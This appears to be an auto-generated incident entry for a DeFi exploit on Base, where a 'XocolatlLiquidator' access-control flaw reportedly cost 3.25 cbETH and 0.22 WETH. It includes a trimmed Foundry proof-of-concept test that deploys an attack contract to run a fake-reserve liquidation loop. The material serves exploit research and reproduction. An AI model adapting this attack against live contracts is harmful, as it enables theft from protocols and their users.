# [?] XocolatlLiquidator - Access Control / Input Validation

## Summary
Severity: Unknown
Chain: Base
Component: XocolatlLiquidator
Published: 2026-03-24
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-03/XocolatlLiquidator_exp.sol
Type: defi-exploit-poc

## Details
Lost: 3.25 cbETH and 0.22 WETH

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    uint256 private constant FORK_BLOCK = 43_801_482;
    uint256 private constant MIN_CBETH_PROFIT = 3 ether;
    uint256 private constant MIN_WETH_PROFIT = 0.2 ether;

    function setUp() public {
        vm.createSelectFork("base", FORK_BLOCK);
        fundingToken = CBETH;
        multiAssetLog = true;
        attacker = ATTACKER;
        _addFundingToken(CBETH);
        _addFundingToken(WETH_TOKEN);

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(ACCOUNT_LIQUIDATOR_PROXY, "AccountLiquidator proxy");
        vm.label(ASSETS_ACCOUNTANT, "AssetsAccountant");
        vm.label(PYTH, "Pyth");
        vm.label(CBETH, "cbETH");
        vm.label(WETH_TOKEN, "WETH");
        vm.label(CBETH_RESERVE, "cbETH HouseOfReserve");
        vm.label(WETH_RESERVE, "WETH HouseOfReserve");
    }

    function testExploit() public balanceLog {
        uint256 cbEthBefore = IERC20(CBETH).balanceOf(ATTACKER);
        uint256 wethBefore = IERC20(WETH_TOKEN).balanceOf(ATTACKER);

        XocolatlLiquidationAttack attack = new XocolatlLiquidationAttack(ATTACKER);
        vm.deal(address(attack), 0.001 ether);

        // step 1: run the fake-reserve liquidation loop and withdraw the seized reserve assets.
        attack.execute();

        uint256 cbEthProfit = IERC20(CBETH).balanceOf(ATTACKER) - cbEthBefore;
        uint256 wethProfit = IERC20(WETH_TOKEN).balanceOf(ATTACKER) - wethBefore;
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-03/XocolatlLiquidator_exp.sol_
